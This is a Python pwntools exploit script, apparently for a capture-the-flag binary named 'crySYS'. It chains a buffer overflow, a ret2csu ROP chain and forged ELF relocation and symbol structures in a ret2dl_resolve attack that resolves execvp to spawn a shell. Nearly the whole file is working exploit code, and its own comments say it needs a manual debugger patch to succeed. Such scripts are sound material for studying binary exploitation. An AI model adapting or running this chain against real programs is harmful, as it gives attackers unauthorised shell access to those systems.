from pwn import *

# setup general settings
context.terminal = ["xfce4-terminal", "--disable-server", "-e"]
context.arch = "amd64"

# spawn process, and read elf file
p = process("./crySYS")
bin_elf = ELF("./crySYS")


RESOLVER_ADDR = 0x4003E6 # call dl_resolve wihtout pushing link_map
# we need to create our own link_map and reloc_arg
RESOLVER_ADDR = 0x4003E0 # push link_map and call dl_resolve
# using 0x4003E0, we dont control and modify the link_map argument
C_AREA        = 0x601030 # controllable area (bss segment)

# resolve structure offsets
SYMTAB = 0x4002B8
STRTAB = 0x400318
JMPREL = 0x4003B0

################# First Stage ##################################################
""" ropchain via ret2csu for another read call on a known address, this
    read we will pass our forged JMPREL struct and SYMTAB struct
    
    read(0, buf, 0x100) -> read(rdi, rsi, rdx)
"""

# calling read using ret2csu -> call [r12+rbx*8]
# we write the got address of read into r12 and clear rbx

# ROP gadgets
CSU_RET    = 0x40057A
'''
.text:000000000040057A 5B             pop     rbx
.text:000000000040057B 5D             pop     rbp
.text:000000000040057C 41 5C          pop     r12
.text:000000000040057E 41 5D          pop     r13
.text:0000000000400580 41 5E          pop     r14
.text:0000000000400582 41 5F          pop     r15
.text:0000000000400584 C3             retn
'''

CSU_CALL = 0x400560
'''
.text:0000000000400560 4C 89 FA             mov  rdx, r15
.text:0000000000400563 4C 89 F6             mov  rsi, r14
.text:0000000000400566 44 89 EF             mov  edi, r13d
.text:0000000000400569 41 FF 14 DC          call [r12+rbx*8]
'''

RELOC_READ = 0x601018

chain_read  = b""
chain_read += b"A"*80                   # overflow padding
chain_read += b"B"*8                    # fake rbp
chain_read += p64(CSU_RET)              # gadget (see above)
chain_read += p64(0)                    # RBX
chain_read += p64(1)                    # RBP (to pass cmp rbp, rbx after call)
chain_read += p64(RELOC_READ)           # R12 (read GOT entry)
chain_read += p64(0)                    # R13 (has to be zero for stdin read)
chain_read += p64(C_AREA)               # R14 (ptr to controlable buffer)
chain_read += p64(0x100)                # R15 (amount we want to read)
chain_read += p64(CSU_CALL)
chain_read += b"D"*8                    # to counter (add rsp,8) after call


################# Secod Stage ##################################################
""" the read from the first Stage has to read our forged structs, these will
    be created in this stage

    size(Elf64_Sym) = 24, therfore all structs have to be 24byte aligned

    we need a forged JMPREL struct and a forged SYMTAB struct:

    JMPREL struct (read): { 0x601018, 0x100000007, 0}
                          {GOT offset, r_info, idk  }

      GOT offset: where to write the resolved address
      r_info: last byte describes the type of rellocation and (r_info>>0x20)
              describes the offset in the symbol table

    SYMTAB struct (read): {0xb, 0x12, 0, 0, 0, 0}
    typedef struct {
      Elf64_Word	st_name;        # offset in STRTAB
      unsigned char	st_info;
      unsigned char	st_other;
      Elf64_Half	st_shndx;
      Elf64_Addr	st_value;
      Elf64_Xword	st_size;
    } Elf64_Sym;
"""

# forged area starts after the sh\x00 string
forged_area = C_AREA + 0x20                      # space for sh\x00 string area

# calculate rel offset
# JMPREL_Entry = JMPREL + ( bit32(rel_offset)+bit32(rel_offset)*2 ) * 8
# rel_offset = ((JMPREL_Entry - JMPREL)/8)/3
rel_offset = int((forged_area - JMPREL)/24)  # must be divideable with zero rest
print("REL OFFSET: {}".format(hex(rel_offset)))

# create forged jmprel struct
elf64_sym_struct = forged_area + 0x28            # sym struct offset
index_sym = int((elf64_sym_struct - SYMTAB)/24)  # calculate index

r_info = (index_sym << 32) | 0x7                 # 7 -> plt reloc type
elf64_jmprel_struct  = p64(bin_elf.got['read'])  # just reuse read offset
elf64_jmprel_struct += p64(r_info)
elf64_jmprel_struct += p64(0)
elf64_jmprel_struct += b"P"*16                   # padd to size 40 for second 24 division

print("ELF64_JMPREL_struct:")
print(elf64_jmprel_struct)

# create forged symbol table entry
st_name = (elf64_sym_struct + 0x20) - STRTAB     # offset to "execvp"
elf64_sym_struct = p64(st_name) + p64(0x12) + p64(0) + p64(0)

print("ELF64_SYM_struct:")
print(elf64_sym_struct)

# putting structs together
chain_structs  = b"sh\x00"            # bin sh string as argument to resolver
chain_structs += p64(0)               # for execvp testing
chain_structs += b"P"*21              # padding to length 24
chain_structs += elf64_jmprel_struct  # forged jmprel entry struct
chain_structs += elf64_sym_struct     # forged symbol table struct
chain_structs += b"execvp\x00"        # function to resolve
chain_structs += b"X"*17              # end of forged struct


################# Third Stage ##################################################
""" we have now a read call and the forged structs, the last step is
    to create a rop chain which calls the dynamic resolver

    after the rop chain of stage one, we start with this one at offset 40057A,
    as we dont need this registers, we fill them with padding

    .text:000000000040057A 5B             pop     rbx
    .text:000000000040057B 5D             pop     rbp
    .text:000000000040057C 41 5C          pop     r12
    .text:000000000040057E 41 5D          pop     r13
    .text:0000000000400580 41 5E          pop     r14
    .text:0000000000400582 41 5F          pop     r15
    .text:0000000000400584 C3             retn

    int execvp(const char *file, char *const argv[]);
"""

# ROP gadgets for setting up parameters of execvp
POP_RDI = 0x400583               # set sh\x00 string address
'''
.text:0000000000400583 5F             pop     rdi
.text:0000000000400584 C3             retn
'''

POP_RSI_POP_R15_RET = 0x400581   # set argv to a null ptr
'''
.text:0000000000400581 5E             pop     rsi
.text:0000000000400582 41 5F          pop     r15
.text:0000000000400584 C3             retn
'''

chain_read += b"P"*8*6                  # Padding
chain_read += p64(POP_RDI)              # set execvp file arg
chain_read += p64(C_AREA)               # sh string
chain_read += p64(POP_RSI_POP_R15_RET)  # empty args str
chain_read += p64(C_AREA+2)             # null ptr arg to execvp
chain_read += b"R"*8                    # dummy r15
chain_read += p64(RESOLVER_ADDR)        # call resolver
chain_read += p64(rel_offset)           # reloc_index arg
chain_read += b"E"*16                   # end of chain

# hopefully pops shell after here :D


################# Final Stage ##################################################
""" sending everything to the process """

''' # Debugging:
print("Read Chain:")
print(chain_read)
print("")

print("Structs Chain:")
print(chain_structs)
'''

# attaching radare for debugging
#offset = 0x400505     # bp at leave
offset = 0x400506     # bp at ret
gdb.attach(p, r2cmd="db {}".format(hex(offset)))

# Send first stage and third stage payload, read ROP-chain plus resolver call
p.send(chain_read)

# waiting for the first stage to read the forged structs
raw_input("wait for second read")

# Send second stage, forged structs
p.send(chain_structs)

# keep process alive
p.interactive()


'''
  execvp offset: 0xE5350

  dl_fixup source code:
  https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#65

  # TODO: write Zero to link_map version pointer
  Note:
  the exploit does not work without setting the version to zero using
  radare, I did not manage to set it to zero using the given ROP gadgets

  Resources:
  https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62
  https://www.rootnetsec.com/ropemporium-ret2csu/
  https://1ce0ear.github.io/2017/10/20/return-to-dl/
  (mentions the VERSION problem)
  https://ddaa.tw/hitcon_pwn_200_blinkroot.html
'''
